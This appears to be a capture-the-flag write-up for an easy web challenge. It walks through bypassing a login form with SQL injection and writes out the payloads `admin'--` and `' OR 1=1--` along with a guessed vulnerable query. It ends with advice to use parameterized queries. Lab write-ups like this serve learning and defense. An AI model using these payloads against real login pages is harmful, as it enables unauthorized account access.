---
layout: post
title: "SimpleLogin — SQL Injection bypass"
ctf: "ExampleCTF 2026"
category: web
difficulty: easy
points: 100
tags: [sql-injection, authentication-bypass]
---

## Challenge description

> "Our new login portal is bulletproof. Can you get in?"
>
> `http://chall.examplectf.com:5000`

## Reconnaissance

Opening the page we find a classic username/password form. Checking the source reveals no client-side validation, so the input goes straight to the backend.

Let me probe for SQL injection:

```
Username: admin'--
Password: anything
```

The server returned a 500 error — the query is breaking, which confirms unsanitized input.

## Exploitation

The backend query is likely:

```sql
SELECT * FROM users WHERE username = '$input' AND password = '$pass'
```

Injecting a comment to drop the `AND password` clause:

```
Username: admin'--
Password: (blank)
```

```
Username: ' OR 1=1--
Password: (blank)
```

The second payload logs us in as the first row in the database.

## Flag

<div class="flag-box">flag{s1mpl3_sqli_byp4ss_ftw}</div>

## Takeaways

- Always use prepared statements / parameterized queries.
- `'--` is the first thing to try on any login form.
- Error messages leaking 500 responses confirm injection points.
